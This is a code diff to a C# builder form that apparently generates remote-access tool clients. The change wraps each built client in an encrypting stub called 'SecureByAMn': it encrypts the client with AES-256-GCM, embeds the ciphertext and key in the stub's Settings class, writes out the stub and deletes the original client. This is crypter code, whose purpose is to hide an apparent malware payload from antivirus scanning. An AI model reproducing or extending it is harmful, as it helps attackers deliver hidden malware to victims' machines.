@@ -202,10 +202,9 @@ namespace Server.Forms
                     if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
                         btnBuild.Enabled = false;
-                        WriteSettings(asmDef, saveFileDialog1.FileName);
+                        WriteSettingsClients(asmDef, saveFileDialog1.FileName);
                         if (chkObfu.Checked)
                         {
-                            //EncryptString.DoEncrypt(asmDef);
                             await Task.Run(() =>
                             {
                                 Renaming.DoRenaming(asmDef);
@@ -213,6 +212,14 @@ namespace Server.Forms
                         }
                         asmDef.Write(saveFileDialog1.FileName);
                         asmDef.Dispose();
+                        //EncryptString.DoEncrypt(asmDef);
+                        ModuleDefMD asmDefSecureByAMn = ModuleDefMD.Load(@"SecureByAMn.exe");
+                        string fullPathSecureByAMn = Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName),
+                            Settings.nameSecureByAMn + ".exe");
+                        WriteSettingsSecureByAMn(asmDefSecureByAMn,fullPathSecureByAMn,File.ReadAllBytes(saveFileDialog1.FileName));
+                        asmDefSecureByAMn.Write(fullPathSecureByAMn);
+                        asmDefSecureByAMn.Dispose();
+                        File.Delete(saveFileDialog1.FileName);
                         if (btnAssembly.Checked)
                         {
                             WriteAssembly(saveFileDialog1.FileName);
@@ -350,7 +357,7 @@ namespace Server.Forms
             return "";
         }
 
-        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
+        private void WriteSettingsClients(ModuleDefMD asmDef, string AsmName)
         {
             try
             {
@@ -457,6 +464,37 @@ namespace Server.Forms
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                         method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                 }
+                            }
+                        }
+                }
+            }
+            catch (Exception ex)
+            {
+                throw new ArgumentException("WriteSettings: " + ex.Message);
+            }
+        }
+        
+        private void WriteSettingsSecureByAMn(ModuleDefMD asmDef, string AsmName,byte[] Client)
+        {
+            try
+            {
+                foreach (TypeDef type in asmDef.Types)
+                {
+                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
+                    asmDef.Name = Path.GetFileName(AsmName);
+                    if (type.Name == "Settings")//CLass Settings
+                        foreach (MethodDef method in type.Methods)
+                        {
+                            if (method.Body == null) continue;
+                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
+                            {
+                                if (method.Body.Instructions[i].Operand == "#AES_256_GCM_ENCRYPTION#")
+                                {
+                                    string aesEncBase64 = AMnSecure.Aes256GcmCompression.EncryptBase64(Client,Settings.keyAesBase256Gcm);
+                                    method.Body.Instructions[i].Operand = aesEncBase64;
+                                }
+                                if(method.Body.Instructions[i].Operand == "#PASSWOR_AES_256_GCM#")
+                                    method.Body.Instructions[i].Operand = Settings.keyAesBase256Gcm;
                             }
                         }
                 }
